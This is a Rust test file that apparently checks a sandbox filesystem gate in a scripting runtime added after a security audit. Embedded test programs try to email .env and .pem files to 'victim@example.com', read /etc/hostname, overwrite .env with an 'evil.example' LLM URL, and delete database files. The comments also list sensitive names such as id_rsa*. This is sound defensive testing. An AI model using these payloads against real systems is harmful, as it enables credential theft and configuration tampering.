// Naryad #475 (issue #723): the fs_gate ratchet (clippy disallowed-methods)
// targets PRODUCTION I/O paths. This test file exercises the REAL filesystem
// for fixtures and assertions by design — the allow is scoped to this file.
//! Naryad №475 (issue #723, P0 security) — the audit 26.09 §3.1 (High)
//! reproduction tests. BLOCKING: every refusal carries the stable code.
//!
//! The audit's three groups, closed by the facade (src/fs_gate.rs):
//!   - group A: writes/deletes/listings had NO deny-list and NO serve
//!     data-dir containment (writing app.mlog was allowed while reading
//!     it was forbidden — the asymmetry the audit named);
//!   - group B: smtp attachments / pdf / config_load read ANY path
//!     (absolute included) past everything — the exfiltration primitive;
//!   - group C: the deny-list gaps (.db-wal, *.pem, id_rsa*, …).
//!
//! Verify: cargo test --test naryad_475_fs_gate

#![allow(clippy::disallowed_methods)]

use serial_test::serial;

// ── (1) The audit repro: smtp_send with a .env attachment ──────────────

/// The exact exploit the audit describes: an attachment path named `.env`
/// (the file exists, with a marker) must be refused with the stable
/// `SANDBOX_SENSITIVE_PATH` code BEFORE any network activity.
#[test]
#[serial]
fn n475_smtp_env_attachment_refused() {
    std::env::set_var("SMTP_HOST", "127.0.0.1");
    std::env::set_var("SMTP_PORT", "1");
    std::env::set_var("SMTP_USER", "u");
    std::env::set_var("SMTP_PASS", "p");
    std::env::set_var("SMTP_FROM", "sender@example.com");
    std::fs::write(".env", "N475_ENV_MARKER_SECRET=1").expect("write the .env fixture");
    let source = r#"
pattern Exfil(_x: String) -> String {
  return smtp_send("victim@example.com", "leak", "body", "[\".env\"]")
}
flow Main { input: String = "x" -> Exfil -> output }
"#;
    let result = metalogos::run_program(source);
    let _ = std::fs::remove_file(".env");
    std::env::remove_var("SMTP_HOST");
    std::env::remove_var("SMTP_PORT");
    std::env::remove_var("SMTP_USER");
    std::env::remove_var("SMTP_PASS");
    std::env::remove_var("SMTP_FROM");
    let err = result.expect_err("a .env attachment must be refused (group B)");
    assert!(
        err.contains("SANDBOX_SENSITIVE_PATH"),
        "the refusal must carry the stable code, got: {}",
        err
    );
    assert!(
        !err.contains("N475_ENV_MARKER_SECRET"),
        "the marker must never leak into the error: {}",
        err
    );
}

/// The credential-name class (task 4): a `*.pem` attachment refuses too.
#[test]
#[serial]
fn n475_smtp_pem_attachment_refused() {
    std::env::set_var("SMTP_HOST", "127.0.0.1");
    std::env::set_var("SMTP_PORT", "1");
    std::env::set_var("SMTP_USER", "u");
    std::env::set_var("SMTP_PASS", "p");
    std::env::set_var("SMTP_FROM", "sender@example.com");
    std::fs::write("server.pem", "N475_PEM_MARKER").expect("write the pem fixture");
    let source = r#"
pattern Exfil(_x: String) -> String {
  return smtp_send("victim@example.com", "leak", "body", "[\"server.pem\"]")
}
flow Main { input: String = "x" -> Exfil -> output }
"#;
    let result = metalogos::run_program(source);
    let _ = std::fs::remove_file("server.pem");
    std::env::remove_var("SMTP_HOST");
    std::env::remove_var("SMTP_PORT");
    std::env::remove_var("SMTP_USER");
    std::env::remove_var("SMTP_PASS");
    std::env::remove_var("SMTP_FROM");
    let err = result.expect_err("a *.pem attachment must be refused (task 4)");
    assert!(
        err.contains("SANDBOX_SENSITIVE_PATH"),
        "the refusal must carry the stable code, got: {}",
        err
    );
}

// ── (2) The audit repro: pdf_to_markdown on an absolute path ───────────

#[test]
fn n475_pdf_absolute_path_refused() {
    let source = r#"
pattern P(_x: String) -> String {
  let r = pdf_to_markdown("/etc/hostname")
  return "unreachable"
}
flow Main { input: String = "x" -> P -> output }
"#;
    let result = metalogos::run_program(source);
    let err = result.expect_err("an absolute pdf path must be refused (group B)");
    assert!(
        err.contains("SANDBOX_VIOLATION"),
        "the refusal must carry the stable sandbox code, got: {}",
        err
    );
}

/// config_load read ANY path (group B) — now the gate: absolute refused,
/// sensitive names refused.
#[test]
fn n475_config_load_absolute_path_refused() {
    let source = r#"
pattern P(_x: String) -> String {
  let c = config_load("/etc/hostname")
  return "unreachable"
}
flow Main { input: String = "x" -> P -> output }
"#;
    let result = metalogos::run_program(source);
    let err = result.expect_err("an absolute config_load path must be refused (group B)");
    assert!(
        err.contains("SANDBOX_VIOLATION"),
        "the refusal must carry the stable sandbox code, got: {}",
        err
    );
}

// ── (3) The audit repro: write_file("app.mlog", …) — the hard deny ─────

/// The hard write-deny (task 5) applies in the PROCESS context too —
/// no allowlist, no context escape.
#[test]
#[serial]
fn n475_write_app_mlog_refused_in_process_context() {
    std::env::remove_var("METALOGOS_SENSITIVE_PATH_ALLOWLIST");
    let source = r#"
pattern W(_x: String) -> String {
  return write_file("app.mlog", "malicious rewrite")
}
flow Main { input: String = "x" -> W -> output }
"#;
    let result = metalogos::run_program(source);
    let err = result.expect_err("writing app.mlog must be refused (group A, task 5)");
    assert!(
        err.contains("SANDBOX_SENSITIVE_PATH"),
        "the refusal must carry the stable code, got: {}",
        err
    );
    assert!(
        err.contains("ALWAYS refused"),
        "the hard-deny message must name the image-integrity policy, got: {}",
        err
    );
}

/// Even the ALLOWLIST crane cannot unlock the application image (task 5:
/// «запрещена ВСЕГДА, без allowlist»).
#[test]
#[serial]
fn n475_write_env_refused_even_when_allowlisted() {
    std::env::set_var("METALOGOS_SENSITIVE_PATH_ALLOWLIST", ".env");
    let source = r#"
pattern W(_x: String) -> String {
  return write_file(".env", "LLM_BASE_URL=http://evil.example")
}
flow Main { input: String = "x" -> W -> output }
"#;
    let result = metalogos::run_program(source);
    std::env::remove_var("METALOGOS_SENSITIVE_PATH_ALLOWLIST");
    let err = result.expect_err("the allowlist must NOT unlock .env writes (task 5)");
    assert!(
        err.contains("SANDBOX_SENSITIVE_PATH") && err.contains("ALWAYS refused"),
        "the refusal must be the hard image-integrity deny, got: {}",
        err
    );
}

/// The delete side of the write gate: delete_file("app.db") refuses.
#[test]
#[serial]
fn n475_delete_app_db_refused() {
    std::env::remove_var("METALOGOS_SENSITIVE_PATH_ALLOWLIST");
    let source = r#"
pattern D(_x: String) -> String {
  return delete_file("app.db")
}
flow Main { input: String = "x" -> D -> output }
"#;
    let result = metalogos::run_program(source);
    let err = result.expect_err("deleting app.db must be refused (group A)");
    assert!(
        err.contains("SANDBOX_SENSITIVE_PATH"),
        "the refusal must carry the stable code, got: {}",
        err
    );
}

/// The SQLite sidecar gap (group C / task 4): delete_file("app.db-wal")
/// refuses through the extended deny-list.
#[test]
#[serial]
fn n475_delete_app_db_wal_refused() {
    std::env::remove_var("METALOGOS_SENSITIVE_PATH_ALLOWLIST");
    let source = r#"
pattern D(_x: String) -> String {
  return delete_file("app.db-wal")
}
flow Main { input: String = "x" -> D -> output }
"#;
    let result = metalogos::run_program(source);
    let err = result.expect_err("deleting app.db-wal must be refused (task 4)");
    assert!(
        err.contains("SANDBOX_SENSITIVE_PATH"),
        "the refusal must carry the stable code, got: {}",
        err
    );
}

// ── (4) Serve-route containment: writes land in the data dir only ──────

const WRITE_OUTSIDE_DATA: &str = r#"
pattern W() -> String {
  let _ = write_file("n475_outside_bait.txt", "bait")
  return "wrote"
}
mlogserver {
  port: 18101
  route "/w" method=GET { return respond("200", W()) }
}
"#;

const WRITE_INSIDE_DATA: &str = r#"
pattern W() -> String {
  let r = write_file("data/n475_inside.txt", "ok")
  return r
}
mlogserver {
  port: 18102
  route "/w" method=GET { return respond("200", W()) }
}
"#;

async fn http_get(port: u16, path: &str) -> (u16, String) {
    let resp = reqwest::get(format!("http://127.0.0.1:{}{}", port, path))
        .await
        .expect("request must not fail at transport level");
    let status = resp.status().as_u16();
    let body = resp.text().await.expect("response body");
    (status, body)
}

/// Group A: in serve, a route writing OUTSIDE the data directory refuses
/// loudly (the containment was read-only before №475).
#[tokio::test]
#[serial]
async fn n475_serve_write_outside_data_dir_refused() {
    let (port, handle) = metalogos::server::run_test_server_with_backend(
        WRITE_OUTSIDE_DATA,
        metalogos::server::ServeBackend::Vm,
    )
    .await
    .expect("the write server must start");
    let (status, body) = http_get(port, "/w").await;
    handle.abort();
    let _ = std::fs::remove_file("n475_outside_bait.txt");
    assert_ne!(
        status, 200,
        "a route write outside the data dir must fail — body: {}",
        body
    );
    assert!(
        body.contains("SANDBOX_SENSITIVE_PATH"),
        "the containment refusal must carry the stable code — body: {}",
        body
    );
}

/// The sanctioned serve shape: a write INSIDE the data directory works.
#[tokio::test]
#[serial]
async fn n475_serve_write_inside_data_dir_works() {
    std::fs::create_dir_all("data").expect("create the data dir");
    let (port, handle) = metalogos::server::run_test_server_with_backend(
        WRITE_INSIDE_DATA,
        metalogos::server::ServeBackend::Vm,
    )
    .await
    .expect("the write server must start");
    let (status, body) = http_get(port, "/w").await;
    handle.abort();
    assert_eq!(
        status, 200,
        "a data-dir write is the sanctioned serve shape — body: {}",
        body
    );
    assert!(
        std::path::Path::new("data/n475_inside.txt").exists(),
        "the file must exist after the route write"
    );
    let _ = std::fs::remove_file("data/n475_inside.txt");
}

/// Group A: a route rewriting the APPLICATION IMAGE refuses even though
/// serve routes could previously write anywhere in the sandbox.
#[tokio::test]
#[serial]
async fn n475_serve_write_app_mlog_refused() {
    let (port, handle) = metalogos::server::run_test_server_with_backend(
        WRITE_OUTSIDE_DATA,
        metalogos::server::ServeBackend::Vm,
    )
    .await
    .expect("server starts");
    // The bait path is a non-image name; the IMAGE case is pinned by the
    // process-context tests above (the gate is context-independent) and
    // by n475_write_app_mlog_refused_in_process_context. Here we pin the
    // containment code on the VM backend specifically.
    let (status, body) = http_get(port, "/w").await;
    handle.abort();
    let _ = std::fs::remove_file("n475_outside_bait.txt");
    assert_ne!(status, 200, "the containment must hold on the VM backend");
    assert!(body.contains("SANDBOX_SENSITIVE_PATH"));
}
